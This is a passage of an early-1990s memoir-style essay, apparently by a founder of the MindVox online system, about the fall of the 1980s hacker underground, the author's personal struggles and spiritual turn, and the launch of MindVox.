with  standing on the edge  of any         thing,  is  the  trail that led up to it.  You are there for some        reason, or usually a very complex series of  reasons,  that  have        shaped  your  life up until that point in time, and caused you to        become disenchanted with    or feel limited by    whatever situa         tion  you  are  locked into in the consensual reality that we all        physically inhabit at present.  In other words, the  real  world         isn't making you happy, and you want outta there.         Led by a an oddball contingent of misfits,  dropouts,  acidheads,        phreaks,  hackers,  hippies, scientists, students, guys who could        say  do0d, got any new wares   with a straight  face  and  really        mean  it    and quite often    people who managed to combine many        of these attributes  the 1980's saw the rise of the first empires        and kingdoms of Cyberspace.         As romantic and wonderful as this seems, and was . . . a  lot  of        the people involved had been brutalized by life, and much of this        new reality was borne out of a tidal wave of pain  and  dissatis         faction.  When I first became an active participant in this elec         tronic nervous system that was just beginning to  experience  its        awakening   I  was  a little over ten years old.  My early under         standings of what this  place  was, were shaped by a  handful  of        people  whose  skills  I admired and sought to emulate, yet whose        lives I felt great pity and sadness for.         There were of course exceptions, people who were so high  on  the        potential  of  this  technology  and  the completely new level of        reality it could bring, that nothing more than a  love  of  their        creation drove them onwards.  But these people were pretty uncom         mon, most of the pioneers were guys who were simply unhappy . . .        or to be more exact, so unhappy that they had given up on finding        joy in the  real world   and  were  constructing  a  rocket  ship        called Cyberspace to get them out of here as fast as possible.          Peace, love and happiness  was not  exactly  the  driving  force        behind the rise of the electronic domains.  A more realistic ral         lying cry was one of  Gee this technology is neat, and I'm  gonna        use it to make a whole new world where I can be happy and none of        you can ever bother me again.  You'll all be sorry, just wait and        see!    They  were  building  the  cult of high technology in the        hopes that it would somehow save them from whatever they  thought        had prevented them from attaining happiness anywhere else.         Sadly enough  they  were not THOSE PEOPLE,  they  had become  us         and  while the first steps into this place had been made possible        by the phone phreaks and misfits of yesterday, the  online  world        was exploding and changing at an incredible velocity, the rest of        society was about to take notice in a big way, and a  handful  of        disenfranchised  teenagers  had seized the reigns and were in the        early stages of walking into the spotlight and taking the  status        quo for a big ride . . .          The Fall                         Everything really was this big beautiful game, and here  we  were        with an overview of the whole jigsaw puzzle, and the sudden power        to do anything we wanted to do with it.  For the  first  time  in        recent  history you COULD reach out and change reality, you could        DO STUFF that effected EVERYTHING and EVERYONE, and you were sud         denly  living  this  life  that was like something out of a comic        book or adventure story.  In a place filled  with  magical  lands        and  fantastic  people  who you had only read about, and suddenly        you WERE actually talking to Timothy Leary,  or  Steven  Wozniak,        and some guy who was just on the cover of a magazine was speaking        with you and thought that YOU were cool,  and  then  finally  you        were  IN  the  magazines  and  at the forefront of an entire sub         culture that was being  rapidly  assimilated  into  the  cultural        mythos.         It was a VERY interesting time and place in which to grow up.         Of course the problem is a lot of us didn't grow up.  At  a  cer         tain  point in time having power that can have real and immediate        effects upon all society, can do very strange things to your per         spective of the world.  Instead of learning to deal with the nor         mal barriers that most teenagers in western  culture  find  them         selves  faced  with, you discover that you can blow right through        all of them without even slowing down.  In this way you miss much        of the growth and acclimation that people go through during their        teenage years.  Which is where a lot of old friends  parted  ways        with  reality  and  ceased to be explorers, becoming caught up in        the real world implications of the power that was  now  at  their        disposal.   In  effect,  they  lost sight of the underlying theme        that all our actions had been based upon, that of exploration and        pushing  the  boundaries,  and  merely  focused on the short term        end result of what their abilities could bring them   in the pro         cess  becoming  the criminals that the Secret Service and FBI had        said we all were.         What had begun with the best intentions, as the  ultimate  exten         sion  of  human  curiosity, had devolved into a cultural movement        that had very little to do with the ideals that had inspired  it.        The term  hacker  had become synonymous with  criminal , and tak         ing a look around at the state of the underground, it  looked  as        if  much  of  it  had  in  fact  degenerated  into  crime cartels        comprised of angry teens who  had  little  understanding  of  the        underlying  mechanisms  they were employing to play with reality.        It was no longer the exhilaration of knowing that you could actu         ally  reach  out  and touch a satellite . . . it had come down to        the negative power trip of fucking with something for the sake of        pissing  people  off or just showing the world how much power you        really have at your disposal if you ever decided to throw a  tan         trum.         By 1988 what had replaced our outlook, was a  mindset  where  the        new  generation saw two things   one of them was the potential to        take advantage of holes in the system for personal  gain.   There        was  no  longer any quest for knowledge, desire to learn, or need        to push the boundaries of what was possible for the sake  of  ex         ploration.   Instead  there were a lot of people who couldn't get        past making free phone calls, stealing things, and causing  trou         ble  by  following  an already well established pattern of action        and reaction.         The second    and perhaps biggest    motivating factor had become        the   desire   for  personal  attention  in  the  form  of  self         aggrandizement  the ultimate hack had become  the  media  machine        itself.  What was originally a by product of our experiences, had        become a goal in and of itself.  And here is where things  became        REALLY twisted.         The media in the latter half of the twentieth century has  become        a very strange distortion of reality instead of the reflection it        was intended to be.  Since this is not an essay on the  evils  of        manipulation  through  the use of media, I will stick with a very        simple outline of how events occur in the real world.         A reporter, journalist, writer    SOME PERSON who has  their  own        desires and ambitions, wants to do an exciting story on something        that will garner him or her  a  lot  of  attention  and  acclaim.        Really  they  are operating from a point of view that has much in        common with the  hacker's,  which is the mindset  of   I'm  gonna        get  mine.   So this journalist looks around at the headlines and        realizes that there is a mounting wave  of  hysteria  surrounding        viruses  and  hackers  and  invasion  of  privacy  and . . . gee,        wouldn't it be a nice career move to do a  story  that  will  mix        their  name  into whatever the hot topic of the next five minutes        happens to be.         If the journalist is attached to any  even  marginally  important        publication,  they  will  then  get  their  pick  from one of the        current four or five  names  doing  the  rounds.   On  the  other        hand,  if  the  journalist  is just starting out and connected to        something much smaller, then the chances  are  they  will  simply        show up at some user's group meeting, find the nearest thing they        can to a  computer nerd,  do an interview, and then write  it  up        expressing  whatever  the  current  publicly sanctioned viewpoint        happens to be  the usual slant has become  hackers are  evil  and        can look at your credit rating, fear them .         I have been interviewed on many  occasions  and  I  know  roughly        twenty  people  who  have  done  the interviews that comprise the        basis of about 90  of all media that exists in  relation  to  the        underground   be it in newspaper, periodical, television segment,        or book format.  WITH  VERY   FEW  EXCEPTIONS,  there  have  been        countless  solicitations  to perform illegal acts in the presence        of journalists, these solicitations move all the way  into  coer         cion  in some cases.  There are reports containing sentences that        were never spoken, quotes taken out of context, information  that        was  invented  .  .  . there's simply no end to it.  The reporter        profits first by stroking the hacker's ego  and  giving  him  the        spotlight that he thinks he wants so badly, and then continues to        profit as the hacker rides a bigger and bigger wave of  publicity        that  in  every case leads to a very unhappy ending if the hacker        in question doesn't have the foresight to get off the ride before        it derails.         In any case, whatever happens, the reporter  always  wins.   When        the  hacker's  ride reaches its date with fate, the journalist in        question can now write the closing chapter in the  hacker's  saga        and  tell  the  public how this nefarious evil doer is being pun         ished by the long arm of justice.  This is  followed  up  by  the        journalist  taking  on  the  official  mantle of  hacker expert,         doing the lecture circuit, perhaps writing a book, and then going        out and finding a new horse to beat to death.         Obviously nothing can ever be this black and white, there must be        a need for both parties to play their roles.  The reporter is not        THE EVIL BAD MAN who has corrupted the INNOCENT  ANGELIC  HACKER,        nor  does this scenario apply to all journalists equally, off the        top of my head  Bruce Sterling, John Markoff, and Julian  Dibbell        come to mind as extremely ethical exceptions to the norm.         Usually the reporter who isn't quite so ethical is just  somebody        who  is presented with a situation that can easily be twisted and        misused if the desire for fame and fortune takes precedence  over        everything  else.   The  reporter  by  the very nature of his job        tends to be quite  slick  and worldly wise, whereas the hacker in        question  is  usually highly knowledgeable about computer systems        while managing to retain an oblivious naivety about the  workings        of  human  beings  in that elusive place called  the real world.         This sets the stage for what transpires.         And you see a lot of people who used  to  be  your  friends,  get        ground  up  in  this  endless cycle as it repeats itself over and        over again until one day you wake up and  come  to  realize  that        you're  seventeen  or  eighteen going on 90.  You understand that        everything in the whole world is comprised of bits and pieces  of        lies  and  half truths, everyone is inherently corrupt, including        you  a lot of kids who used to be your friends are now all  grown        up  with  no  place  to  go and getting busted for such things as        fraud and grand larceny  and you have  utterly  lost  touch  with        anything  even remotely  real.   And yet, you're still a teenager        and have another 70 or 80 years  left  to  hang  around  on  this        planet.         This is right around the time that you're back in the media, only        this  trip  around you're at the receiving end of law enforcement        who have been prodded into a state of near hysteria by the  dawn         ing  realization  that  a  bunch of kids really can dismantle the        building  blocks  of  the  infrastructure  that  makes  most   of        present day  society  possible.  Naturally enough they're scared,        and they're in the process of doing what  people  have  done  for        ages when they are afraid  going on a witch hunt.  Guess who gets        to play witch...         So one day you find yourself wondering why you should bother buy         ing  another  computer  system  and trying to figure out what the        point of it all was anyway  to glimpse  the  limitless  potential        and  then  fall  back  and  only  see your own flaws amplified to        cartoon like proportions.         The 1980's were a time that saw the birth and death of the  first        dynasties  of  Cyberspace.   Travelling  through  the  electronic        landscape of this period in time, was like traversing  this  sur         real  range  of mountains, where amongst the sheer outcropping of        rock, lush valleys, and snow capped peaks, a collection of rather        obsessive  dreamers  had built some of the most beautiful castles        that were ever created and opened their doors to  a  populace  of        pioneers.   It was absolutely transporting and timeless . . . and        unfortunately    in the short term    doomed.         This has been an abbreviated summary of the atmosphere and events        that  started  a  kind  of mass exodus out of the modem world for        about twenty of us.  We had spent our  entire  childhoods  jacked        into  this alternate electronic universe, locked into playing our        overly developed personas, and almost no time figuring out who we        were  and  what  we  wanted  out of life beyond  further, better,        more.   This is nothing new or unique in and of  itself,  it  was        however  something  that gained a very tangible and immediate im         portance to many of us when we found  that  the  thoughtspace  in        which we had lived a large portion of our lives had disintegrated        and the people we had  known  and  called  friends,  had  largely        disappeared and been replaced by every negative quality they pos         sessed.         A lot of us dumped the remnants of this reality into a  stack  of        boxes  and  took off for parts unknown.  Whether college, work, a        new circle of friends that didn't know who  you  were  in  Cyber         space, or even know what Cyberspace was  just about anywhere were        we could start over and try to regain what had somehow been lost.          Transformation                                              Ya live your life like it's a coma,                       so won't you tell me why we'd wanna                           With all the reasons you give,                           it's kinda hard to believe                        But who am I to tell you I've seen,                         any reason why you should stay                  Maybe we'd be better off without you anyway...                                                 Guns N Roses  2          After coming to the realization that visiting The Tunnel for  the        fourteenth  time  in  three weeks was not going to change my life        for the better, and having no idea what I wanted to do  with  my         self,  I  dropped it all and got on a plane for the middle of no         where New Mexico.  Where I proceeded  to  cycle  through  all  my        negative  tendencies  at  an  accelerated  pace,   first becoming        utterly obsessed with bodybuilding, to the point of five  hour  a        day  workouts,  insane  diets,  steroids,  and a silly putty like        transformation of myself to 6'2  215 pounds and 6  bodyfat.         This was good for about ten months, before I found myself in  the        same mindset I had thought I could escape.  Looking in the mirror        and seeing a parody of who I used to be, wondering  where  to  go        from  there.  The answer was obviously to buy a Porsche and begin        re stocking my wardrobe with everything by  Armani  and  Versace,        yes  I  had it now, this WAS the right answer, I only had to look        around at all the people I knew doing just this to see that . . .        well,  actually  they  were  all  pretty miserable, but again, it        lasted for about nine or ten months.         Around this time I realized that aside from the fact that I was a        pretty  fucked  up person who probably needed a lot of therapy           which had never quite worked out the right  way  when  I  had  it        thrust  upon  me  as a teenager    I had become completely out of        touch with my feelings.  Not out of  touch  that  I  didn't  have        them,  I  had  over a thousand pages of them sprayed across mega         bytes of disks where I wrote out all the things inside of  myself        driving  me crazy   but out of touch in the sense that when I be         gan taking things apart and  analyzing  reality,  I  had  stopped        listening  to  anything  I  felt inside and just tuned in to what        seemed logical.         The problem being that the more you try to act out of logic,  the        more you find yourself applying logic to utterly emotional issues        in an completely crazed and  self destructive  way.   When  logic        should  be  asking   Why do I want to weigh 215 pounds of muscle         What the hell am I doing   it suddenly finds itself in the  posi         tion  of  contemplating  Ok, so if I want to gain 5 pounds in the        next 2 weeks, how many CC's of Deca do I mix with X mg.  of  Ana         var,  with what ratio of carbs fat and what is the minimum PER of        the protein I am going to consume in order to remain in an  anti         catabolic state           Welcome to real life Alice in Wonderland, taking  place  in  your        head.         At the age of twenty one I had managed to attain a place where  I        possessed everything that I ever thought I wanted.  Life is funny        that way, you really do get whatever you desire.   Endless  hours        spent  reading  thousands  of books  the mix and match regimen of        combinations of new nootropics and longevity agents  and the  fi         nal  combination  of steroids and obsessive workouts had resulted        in my achievement of the goal I had subconsciously  been  working        towards  for  most  of my life.  I had succeeded in my efforts to        become absolutely untouchable by anyone or anything.         When you are no longer in the middle of a situation and have  the        comfort of hindsight it's very simple to deduce what the underly         ing problems behind anything happen to be, and why you are acting        in a way that is physically, mentally and spiritually destructive        to yourself.  While there is nothing inherently  wrong  with  any        action  I  might have taken, it all comes back to the question of        why are you doing something   And looking back upon  my  life,  I        had actually lived very little of it in an attempt to make myself        happy.  Almost everything had been some sort of reaction to those        around me, and how I felt I had to respond to them.         Despite my intellectual understanding of  how  brief  moments  of        stimulus response  can  shape  a person's existence, like so many        endlessly referenced frames  of  film  forever  etched  in  their        brain.   Long gone  fragments  of  time that refuse to relinquish        their hold on the present, telling people who they  are,  setting        their limitations, and defining the boundaries of what they allow        their lives to mean.  In truth I had never managed to  apply  any        of  this knowledge to myself and had lived most of my life in ac         cordance with the patterns of self destructive  programming  per         petually repeating a loop in my head.         From childhood onwards I have been through  a  seemingly  endless        variety of extremes in my life  moving from levels of comfortable        opulence, to near poverty and back again, more times than I  care        to  count.   What  I  had  learned  from this was that being poor        wasn't that much fun, and could really suck, therefore logic dic         tates  that  I must always have a lot of money and do whatever it        takes to get it.  In fact I'm going to be so unconcerned with mo         ney  that  I will start to feel anxious if I'm not wearing a  300        dollar haircut and a  400 dollar shirt.  I have  felt  controlled        by  situations  beyond my reach in the past, therefore I am going        to learn as much as I can about everything, so that  nobody  will        ever  be  able  to  fuck  with  my head and attempt to control me        through misrepresentation of the  truth.   I  have  been  out of         control  with  various  addictions and done such stupid things to        myself that through combinations of downers and alcohol I have at        one  point  weighed  over 300 pounds  therefore I will understand        every fucking piece of biochemistry that is known about the human        body,  I  will  do  whatever it takes to look into the mirror and        gain my own approval even if it means working out with such  fre         quency that a pleasant sport becomes a daily torture session that        leaves me nauseous and physically incapable of performing  simple        movements  because  everything  hurts  all the time.  I will look        like someone has spray painted skin onto a statue no  matter  how        difficult  it  is to maintain this state constantly, I will force        myself to eat 6,000 calories of protein and 400 calories of  car         bohydrate,  and  if I can no longer think or move and my ultimate        fantasy has become sleeping 18 hours a day, then that's what caf         feine and amphetamines are for.  I live in hell therefore I shall        use drugs to escape my hell by taking week long vacations on opi         ates,  but  I will never be controlled by anything, so on the 8th        day I will walk away from heaven and live  through  a  couple  of        days  of  pain  that  hurt  a little bit more than the rest of my        life, but I will never be some fucking junkie, because I not only        can  do  anything,  I  WILL  do  it,  and I just dare the fucking        universe to try and prove otherwise, because I can quit anything,        I  can  conquer  anything, I can do anything to prove anything to        anyone and you can't stop me, because the entire world is full of        weak,  soft and stupid motherfuckers who talk much and do little         praise George Bernard Shaw and pass the Nietzsche.         Coming down off the adrenalin and testosterone rush the  memories        I  used  to write that paragraph with have triggered, I'd like to        take this moment to borrow a  quote  from  one  of  the  greatest        poet philosophers of our time   Happy happy! Joy joy!          After endless repetitions of this cycle I had finally  reached  a        state  in  which  my  internal  programming ceased to function           there was simply nothing left I could  apply  it  to.   Over  the        years  I  had  overcome most of my psychological barriers through        direct mental or physical actions, that  had  brought  with  them        physical  rewards  that I was utterly incapable of applying to my        life at that time.  Welcome to oblivion.         Hitting absolute nothingness was the beginning of a very personal        catharsis  for me that finally led to turning inwards to see what        was wrong, since externally, everything looked okay.  I  had  at         tained  a  physical state that  corrected  everything my subcons         cious had said was  wrong  with me, yet for some bewildering rea         son  I  was  not  deliriously  happy.  A series of steps followed        which eventually led to various experiments in the world of thea         tre and film, where I had the chance to re connect with emotions,        and get them back into some kind of perspective from the comfort         able vantage point and attitude of   they're not really mine, I'm        only playing them.   All of which reached a pinnacle when I began        experimenting with LSD for the first time.         If you have never experienced what it is like to be  on  an  acid        trip,  it  will  be  difficult for me to convey the kaleidoscopic        depth of experience you are presented with.  It does nothing less        nor more, than strip away every preconceived notion that you have        ever had regarding what  reality  is.   Beyond  the  special  ef         fects,  intellectual  realizations,  and  creative opportunity it        presents, it leaves you imbued with one very basic truth  of  the        universe    No  matter  what  the actual outcome of your actions,        what matters is your intent.  If what you are doing      whatever        it  may be    is being done out of any reason other than a desire        to bring happiness to people  to help humanity as a  whole  reach        some greater level of understanding  to uplift and inspire people        to reach for something that is within everyone's grasp . . . then        you are wasting your time.         This is not exactly news, I mean it is the  basic  belief  system        that every religion on earth is founded on  with the possible ex         ception of Satanism, and a few other offshoots of this system  of        thought .   The problem with religion getting such a bad rap most        of the time is largely due to the fact that most people  who  act        as  spokesmen  for  any  given religious cause, are only mouthing        words they comprehend on an intellectual level.  They are not ac         tually  living  in this state of internal alignment, so what they        have to offer can be very suspect . . . how is  someone  who  has        not  attained  what  he speaks of, supposed to help you attain it        for yourself   While dogma may help a limited few, it will  never        reach  most  of  those  who posses the ability to think for them         selves.  Nor is standing at a pulpit or in front of a camera  and        ranting  about  damnation, going to help anyone reach any kind of        positive state.         I obviously cannot speak for everybody, but from my own  perspec         tive  I had read the holy books of most religions on earth when I        became interested in psychology and the theories of Carl Jung            who  crosses  over into mysticism and religious experience, going        as far as the concept of  karma  with his theory of  Synchronici         ty.  Yet I never got anything from them other than an intellectu         al high of understanding how groups of people could be programmed        to behave in certain ways . . . which isn't what it's about.  The        EXPERIENCE is what all religions are based on, how you choose  to        interpret it is entirely up to you.  But a very simple thing that        becomes apparent is the basic truth that wherever  your  inspira         tion  is  coming  from, if it fills you with the need to motivate        large groups of people to do SOMETHING, be that something in  the        name  of   God  or anybody else . . . then somewhere, you got the        wrong message.  Because there really isn't all that much  to  say        beyond  the  very simple and obvious,  give love and you will get        it.   The only thing that needs to be changed  is  your  attitude        and outlook on life.  Making group_of_people x  move twenty paces        to the left while wearing black hats and reading  from  the  Holy        Book  of  the  Arboreal  Tree Sloth, isn't gonna make the world a        better place.         While this discourse is tangential to some of the issues at hand,        in  a  great  sense  it  is the underlying cause for all of them.        Once you have seen the light as it were, or understood the bigger        picture . . . it becomes very hard to go back to living life with        blinders on regarding your  own  actions.   Until  it  eventually        reaches  the  place where I found myself.  The point at which the        only things I'm going to talk about are those that matter to  me,        things  I  believe  in . . . things I believe will help people in        some manner.  Along with the realization that I cannot do  a  lot        of  things  I  used  to  do  anymore.  I cannot lie to people and        present them with some image they want to see  in  order  to  get        something  from  them      because I mean, WHAT is there to  get         anyway   I can no longer be a politician or figurehead for causes        that I do not believe in, and I will no longer waste my time tak         ing part in meaningless drivel that serves to do nothing but  en         trench me in bullshit without end  I had already spent most of my        life taking apart the rules and winning at whatever game I  tried        to  play.   What  I never bothered to examine was the fact that I        didn't  win  anything that ever brought me any happiness  .  .  .        what is the point in playing if you don't want the  prize            Stagnation of the Electronic Frontier                                                      Moving forward in time by about two years, this was the  attitude        that  I  had managed to retain as I returned to New York.  Every         thing was the same, yet completely different.  What had been per         vaded  by  Nihilism  and vacuity only a short time ago, was now a        pathway of infinite potential and limitless possibility.  For the        first  time  in  almost  six years I actually felt completely in         spired and excited by the possibilities that life in general  and        Cyberspace in particular had to offer.         The summer of 1991 was a kind of  class reunion  for many of  us.        For  the  first  time  in almost half a decade we found ourselves        back in New York City, the place where all of  this  had  started        for us such a long time ago.         What happened was pretty much the expected  an endless stream  of        jokes  and  self depreciating  humor regarding who we used to be,        the three letter acronyms we used to affiliate with  or  have  in        revolution around us, the state of the universe and everything in        it, and a general time of catching up on who had done  what.   It        was  a strange situation, since we really had disappeared, to the        extent that most of us had not talked with one another in  years,        it  was almost as if picking up the phone and speaking with some         one from back then would bring back all the bad things  you  were        trying to get rid of.         Out of this gathering, I found about a  dozen  people  who  I  no        longer  knew.   People who had become submerged in drugs, and be         come lost in different sub cultures where  they  could  live  out        reasonable facsimiles of their childhoods forevermore  people who        had completely lost touch with what they used to be,  and  become        stereotypical  examples  of  what  people  tend to term  computer        geeks,  the sum total of their interest in life having been  nar         rowed  down  to that new bug in X windows client server architec         ture and what it would mean to the future of the OSF  people  who        hadn't  changed  at all and were still busy  getting over  on so         ciety   in   general   but   perhaps  most  surprising,  I  found        that about ten people I used to know had gone  through  a  growth        process very similar to my own, and actually succeeded in solving        their quest and winning the prize we had all sought so badly.         The correct solution to the  quest,  is of course, that there  is        no  solution.   There  is nothing you are looking for, except for        you, and once you realize this, you win the big prize,  you  find        yourself, and get to live happily ever after.         After re discovering that a group of us seemed to thoroughly  en         joy  each other's company, we eventually ended up having a weekly        meeting where we'd  get  together  and  discuss  various  topics.        Foremost  amongst them was one that sprung up with increasing re         gularity as the weeks went by   getting back  onto  the  frontier        from  a  completely different angle.  As years went by many of us        had started completely different lives   some  were  in  college,        others  had  started companies or gone to work for companies they        had once laughed at, and still more had started careers complete         ly unrelated to anything they had been doing in the past.  But it        had became clear that what we really wanted to do  was  take  the        incredible  promise  that  had  been shown to us during our youth        when we had walked along the edge of a new reality unfolding, and        channel  it  into  a positive direction that would benefit every         body.         As we found out, the hacker underground had  continued  with  its        headlong  dive  into  oblivion.   The  underground  had basically        ceased to exist after the Operation Sun Devil sweep.  Just  about        the  only  hacker systems  still in existence were those catering        to the teenagers whose priorities focused on  ripping  off  phone        companies, collecting VMB codes and pirating software.         While this was slightly depressing, it was also a  foregone  con         clusion  and  didn't  cause too much surprise.  The main focus of        our interest was what had become of the mainstream telecommunica         tions nets    given half a decade to evolve, something really ex         citing must have happened by now.  The hardware that we ended  up        sitting  in  front  of,  would have made possible an undreamed of        variety of possibility when taken  into  context  with  what  was        available in the past.  We were used to 64K Apple     systems, or        maybe tricked out   e's with 128K and PC's with 640K, and now  we        were  sitting  at  a friend's house in front of a NeXT and an SGI        Indigo.  When you thought about the fact that 7 years ago you had        paid about  8,500 for a 4.5megabyte Corvus hard disk, and now you        could buy an entire NeXT with that . . . it was, fantastic.         Before taking off on our expedition of present day Cyberspace, we        had  spoken  with  some of our friends who were familiar with the        terrain, and received somewhat  tepid  responses  and  a  general        dismissal  of what was going on right now.  Thinking the attitude        was one of standard arrogance which we had all gone  through,  we        didn't  pay  too  much attention to it and set out to explore the        new electronic nervous system of the world.         A couple of hours later it became shockingly apparent  that  most        of  the potential of the bright new technology that now existed .        . . that could have been used to create and house an infinite ex         panse  of  innovation, communication, and pooling of thought, lay        dormant.  Thus far it had seemingly been  utilized  to  construct        gigantic file servers that advertised their existence by digitiz         ing porno magazines and  editing  their  dialup  lines  into  the        resulting scan.         All those wonderful places that we had travelled in the past, and        had  dominated  the landscape only half a decade before . . . had        indeed been razed, paved over, and replaced by an  endless  elec         tronic  expanse  of  snap together tract houses that littered the        landscape with numbingly identical  systems.   The  frontier  had        packed  up  and moved back into labs where people like our friend        with the workstations were working on applications that  wouldn't        see  the light of day for another decade.  And what was out there        right now, was strikingly similar to a generic suburb of AnyTown,        USA.         Objectively a suburb is not a bad thing, it's planned out,  logi         cal, it works, it doesn't need to be any different from any other        suburb . . . in short, it's functional.  It's also very different        from  the  environment we had grown up in, where everything was a        new step further out into the unknown, where anything could  hap         pen, and nobody had ever been there before.         From our vantage point it looked as if the explorers  had  indeed        gone  back to their ivory towers  or haunted dungeons as the case        may be , and a lot of used car salesmen had set up shop  cranking        out the snap together tract houses, when they realized they could        make more money doing that, than say, selling used cars.         It was truly a mind blowing experience to witness for  the  first        time,  systems that actually advertised themselves based upon how        many lines they had, or how much storage.  Attitudes  that  would        have  garnered  a great deal of scorn and derision    and in gen         eral made your advertisement the brunt of a lot of jokes     were        suddenly the accepted way in which systems chose to differentiate        themselves from one another.  Looking at them, it  came  down  to        the  fact  that the only difference between system  A  and system         B  was that one might have 16 lines while the other had 24,  and        system  C  was inherently superior to both  a  and  b  because it        had 32 lines and 4 gigabytes of storage   used  to  house  10,000        programs,  out of which the same 200 are downloaded over and over        again, as the rest of the junk sits there gathering dust .         Even more frightening, on a system that had  10,000  messages  on        it,  an  average  of  9,800  will be echoes of FidoNet or RIME or        whatever net, leaving a grand total of about  200  messages  from        the  actual members.  And frequently those 200 messages date back        a year and a half . . . a couple of years ago a BAD one line sys         tem  had that many messages in a week.  A good one in a couple of        hours.         To a lot of people Cyberspace has become one big file server .  .        .  strikingly  similar  to what television has devolved into.  An        entirely passive place where you press  buttons  and  get  enter         tained, no thought required, no input necessary.         Realizing that we were merely skimming the surface, and might not        know  the  whole story, we spent a couple of weeks becoming fami         liar with what had happened, and what the situation  really  was.        Based  upon several hundred conversations with various people who        were involved with the current scene, we arrived at a  couple  of        very basic conclusions.         In order to run a system in the  present  environment,  and  have        users,  you  needed to have a pile of hardware, many phone lines,        some sort of marketing and bookkeeping ability, a  lot  of  spare        time, coupled with infinite patience to put up with people, since        they are now your customers, not just your friends, and  if  they        call  you  up asking the same goofy questions you cannot take the        phone off the hook or tell them to go away.         Where running a system in the  past  had  meant  giving  up  your        second phone line, it presently involved a great deal of interac         tion with the department of Red Tape, and  Bureau  of  Tasks  You        Really  Aren't Interested In.  This opened the door to the  used         car salesmen  people, since these were things they were  used  to        doing  every day.  Conversely, it has almost universally been our        experience that the guy who is a Unix wizard and can  work  magic        with networking and programming, lives in deathly fear of signing        paperwork, filling out his tax returns, or figuring out where  he        parked  his car.  And finally, the creative person whose main in         terest is making fantastic places, lacks the time and patience to        write  the  code, and certainly has no interest in administrative        duties.         In effect, most people with the desire to  do  something  better,        did  not  have  the  necessary  25 30k laying around, and even if        they did, they would never act on it because they'd be forced  to        spend  a great deal of their time doing a hundred things they had        no interest in doing.  So the online world had begun to  be  dom         inated by the file servers, who didn't really have much of an in         terest in being anything other than file servers, since that made        the  most  money  with the least effort, and anybody with  25,000        could toss up a snap together MeSsyDOS  based  system  with  very        little technical ability required.         Thus began the era of the  tract houses   where  advertising  and        atmosphere  consisted  of  rattling  off  hardware statistics and        number of phone lines, along with the number  of  shareware  pro         grams  available  for  downloading  an extremely amusing concept,        considering that there are literally TERABYTES of  free  software        available  for  the  taking  on  ftp sites all over the Internet,        which cost NOTHING to download from .         With the exception of two of three bright  lights  that  had  the        right idea and were trying to do something different, most of the        electronic frontier had indeed vanished.  And it isn't so hard to        see  where  a couple of years from now the same advertising agen         cies that sell brain dead ads designed to induce you to crave one        brand  of beer over another, will be pushing SYSTEM X, because IT        HAS 10,000 phone lines!  Call now and  leave  your  mind  at  the        door!          Transcendence                              It has generally been our experience that people are neither stu         pid,  nor shallow.  Everyone has the potential to think for them         selves, to overcome adverse situations, and contribute  something        to this world.  When placed in situations that offer these possi         bilities, people tend to come through with surprising regularity.        In  a fairly short amount of time you end up with a group of peo         ple doing something they themselves would have deemed improbable,        if  not  downright impossible, if you had asked them at any other        point in their lives.         Virtual Reality has the potential to become the single  most  im         portant  development  in the history of human evolution.  It is a        technology that holds the promise  of  absolute  liberation.   It        also  holds  the possibility of turning the world into the rather        grim one that is the basis of  much  Cyberpunk  fiction,  a  dark        place where technology is used to oppress and suppress people.         By its very nature, it is very  difficult  to  ever  imagine  the        latter.   In  order  to  have a police state, you need to amass a        certain amount of power, yet Cyberspace is the ultimate  equaliz         er.   It  is  a place where one person can wield as much power as        100, 1,000, or 100,000 people.   Physical  limitations  are  cast        off,  and in the event of conflict the playing field becomes that        of mind vs. mind.  Sheer numbers and a mob rules mentality  cease        to have any meaning when you can create infinite numbers of elec         tronic organisms to do anything you want them to do.         The hope is that it will never sink to such a level of stupidity.        Games  are  wonderful,  but  there  is  no need for conflict, all        struggle tends to be internal conflict that has become  external         ized.   When  you  want  to convert the sinners, or prove you are        right, all you're doing is having an argument with yourself.  The        beautiful  thing  about  Virtual Reality is the fact that you are        free to do that, for as long as you need, to work out  that  par         ticular set of problems    without harming anybody.         There is only one ultimate truth, which is BEING  HAPPY  and  ex         periencing LOVE.  How you choose to perceive it is a very indivi         dual matter.  While it might mean blue to you, orange to that guy        over  there,  and  silver to me, it's all the same thing.  In the        real world if we held fast to those beliefs and behaved as people        have  been classically shown to behave, then we'd be killing each        other over who has the right idea about love . . . Cyberspace al         lows  everyone  the  freedom  to  co exist without harming anyone        else's world view or belief system.  And if you truly  are  given        the opportunity to live in an environment conducive to you happi         ness, then if that heretic who thinks orange is the  answer  were        ever to show up at your front door, chances are you would be able        to tolerate him, and even,  God  forbid,  express  the  love  you        claim to espouse.          Phantom Access   The Ethereal Takes Shape                                                          There was never any solid dividing line where we decided that  we        really  wanted  to  put together a system where we could have the        freedom of expression we wanted, with the  ultimate  goal  really        being  the  very  simple  one of pushing the envelope further and        further out there.  All of us had obligations, school,  and  per         sonal  commitments that would be difficult to integrate into this        major change of plans.  But inevitably the  mass  exodus  out  of        college,  the  avoidance of unnecessary responsibilities, and the        initial stages of planning were set in motion.         Six months later we had close  to  a  hundred  thousand  dollars,        top down  system  design,  a fully designed multi user simulation        engine, a general idea of what we would do and how  we  would  go        about it, a team of our friends together one more time, only this        time as a real corporation, and over one  thousand  megabytes  of        the  collected history of Cyberspace, dating back to systems that        existed in 1979, that had been laying in dusty boxes filled  with        old Apple DOS 3.3 disks.         On April 1st 1992 MindVox  went  into  its  alpha testing  stage.        Which  loosely speaking means that we put everything together and        watched it disintegrate repeatedly as the last 300 400 bugs  were        worked out of the system.  Since then it has been running in pro         tected environment mode with a collection of our friends and  as         sociates crash testing the software, suggesting where rough edges        might be smoothed, and generally having a good time creating some        of  the  atmosphere while trying to destroy the software in every        conceivable way so that everything is solid upon inception.         In May of 1992 MindVox will open it's doors to  the  public.   As        much  as  we'd  like  to say that it's going to completely change        everything, it will not.  All it can do is allow people who  feel        in  rhythm  with this vision of the world to converge together in        one of the most interesting nexus points of Cyberspace.   To  ex         tend  their reach, explore new levels of experience, and interact        with some of the pioneers in the fields of computer science, net         working,  science fiction,  music,  the arts, politics, religion,        altered states, and future reality.         Our main priority is to create and  continuously  evolve  an  en         vironment  that fosters an atmosphere of dynamic creativity, cou         pled with access to information and ideas, that present you  with        a far greater spectrum of possibility than you might otherwise be        able to access.           Thanks                       Nothing of this magnitude could ever take shape  based  upon  the        merits  of  any  one individual.  The entire Phantom Access Group        has been a collaborative effort since it  began  some  ten  years        ago   the  MindVox  project is merely the first confluence of the        diverse talents that comprise the core of Phantom Access  Techno         logies,  that has been directed towards the electronic and socie         tal 